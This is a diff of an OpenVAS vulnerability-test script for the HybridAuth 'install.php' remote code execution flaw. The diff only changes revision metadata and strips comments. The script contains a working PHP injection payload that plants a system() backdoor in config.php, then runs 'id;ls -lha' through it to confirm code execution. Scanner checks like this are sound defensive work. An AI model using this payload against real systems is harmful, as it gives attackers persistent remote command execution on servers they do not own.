@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hybridauth_remote_code_exec_vuln.nasl 6637 2017-07-10 09:58:13Z teissa $
+# $Id: gb_hybridauth_remote_code_exec_vuln.nasl 11108 2018-08-24 14:27:07Z mmartin $
 #
 # HybridAuth 'install.php' Remote Code Execution Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804753");
-  script_version("$Revision: 6637 $");
+  script_version("$Revision: 11108 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-10 11:58:13 +0200 (Mon, 10 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-08-26 10:58:06 +0530 (Tue, 26 Aug 2014)");
   script_name("HybridAuth 'install.php' Remote Code Execution Vulnerability");
   script_category(ACT_ATTACK);
@@ -72,15 +72,12 @@ include("http_keepalive.inc");
 ## exit if safe checks enabled
 if( safe_checks() ) exit( 0 );
 
-## Get HTTP Port
 port = get_http_port( default:80 );
 
-## Check Host Supports PHP
 if( ! can_host_php( port:port ) ) exit( 0 );
 
 host = http_host_name( port:port );
 
-## Iterate over possible paths
 foreach dir( make_list_unique( "/", "/auth", "/hybridauth", "/social", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
@@ -88,41 +85,32 @@ foreach dir( make_list_unique( "/", "/auth", "/hybridauth", "/social", cgi_dirs(
   sndReq = http_get( item:dir + "/install.php",  port:port );
   rcvRes = http_keepalive_send_recv( port:port, data:sndReq );
 
-  ## confirm the Application
   if( ">HybridAuth Installer<" >< rcvRes ) {
 
-    ## Construct attack request
     url = dir + '/install.php';
 
-    ## Construct post data
     postData = "OPENID_ADAPTER_STATUS=system($_POST[0]))));/*";
 
-    ## Construct the POST request
     sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen( postData ), "\r\n",
                      "\r\n", postData );
 
-    ## Send request and receive the response
     rcvRes = http_keepalive_send_recv( port:port, data:sndReq, bodyonly:FALSE );
 
     if( rcvRes =~ "HTTP/1\.. 200" && "<title>HybridAuth Installer</title>" >< rcvRes ) {
 
-      ## Construct attack request
       url = dir + '/config.php';
 
-      ## Construct post data
       postData = "0=id;ls -lha";
 
-      ## Construct the POST request
       sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                        "Host: ", host, "\r\n",
                        "Content-Type: application/x-www-form-urlencoded\r\n",
                        "Content-Length: ", strlen( postData ), "\r\n",
                        "\r\n", postData );
 
-      ## Send request and receive the response
       rcvRes = http_keepalive_send_recv( port:port, data:sndReq, bodyonly:FALSE );
 
       if( rcvRes =~ "uid=[0-9]+.*gid=[0-9]+" ) {
